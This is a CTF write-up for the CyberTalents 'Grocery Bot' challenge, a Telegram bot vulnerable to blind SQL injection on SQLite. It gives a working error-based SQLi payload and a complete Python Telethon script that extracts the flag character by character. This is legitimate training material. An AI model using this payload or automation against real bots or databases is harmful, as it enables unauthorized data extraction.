---
title: Grocery Bot Web CTF WriteUp @CyberTalents
author: MBZ0x7
date: 2021-09-06 15:10:00 +0800
categories: [CTF]
tags: [ctf,cybertalents]
pin: false
---

### Description
This challenge is hard and requires programming skills to solve it quickly.
```
Its Shopping day

Telegram alias: @ctgrocerybot
```
![](../../assets/img/posts/1/1.png)

### Enumeration
After trying different things. I concluded that it's vulnerable to blind SQLi.
Also, it's using Sqlite.
You can learn more about this type of sqli vulnerability from [here.](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
)

### Manual Exploitation
The payload that we'll be using is below.
```sql
/price flag' AND (SELECT CASE WHEN (SUBSTR(flag,1,1)='a') THEN 1/0 ELSE 'a' END FROM flags)='a"
```
Basically, we'll test lower case alphabets, numbers and underscore for each character flag !

Indeed, you should test uppercase and other non alphanumeric chars, but in our case I know flag possible chars.

In total, over than 3k lines to send to the bot, but you can reduce them by guessing some words in the flag and knowing how it starts,...

### Automatic Exploitation
The problem here that we can't use sqlmap because Telegram uses Websockets for communication.

So, the solution is to write a client to talk to Telegram API and send all payloads to the bot.

First, go to [my.telegram.org/auth](https://my.telegram.org/auth). Add and confirm your phone then go to API development tools and fill in the form with any data.
After that, you'll receive an API_ID and API_HASH that you'll use in the script below.

```python
from telethon.sync import TelegramClient
from string import ascii_lowercase, ascii_uppercase, digits
import time

bot = "@ctgrocerybot"

api_id = 
api_hash = ""

flag_chars = ascii_lowercase + digits + "_"

sleep = 0.5
success = "the item you requested is not found"


flag = "FLAG{"

with TelegramClient('session',api_id,api_hash) as client:
    for pos in range(6, 43):
        for char in flag_chars:
            payload = "/price flag' AND (SELECT CASE WHEN (SUBSTR(flag," + str(
                pos) + ",1)='" + char + "') THEN 1/0 ELSE 'a' END FROM flags)='a"
            print("--> Sending payload: " + payload)
            msg = client.send_message(bot, payload)
            payload_response = client.get_messages(bot)
            print(payload_response[0].message)
            if payload_response[0].message == success:
                flag += char
                print("\033[91m--> Flag: " + flag + "\033[00m")
                break
            print("--> Sleeping for 0.5 seconds")
            time.sleep(sleep)
    client.run_until_disconnected()
flag += "}"
print("\033[91m--> Flag: " + flag + "\033[00m")
```

Make sure to replace `bot`,`api_id` and `api_hash` variables with the corresponding values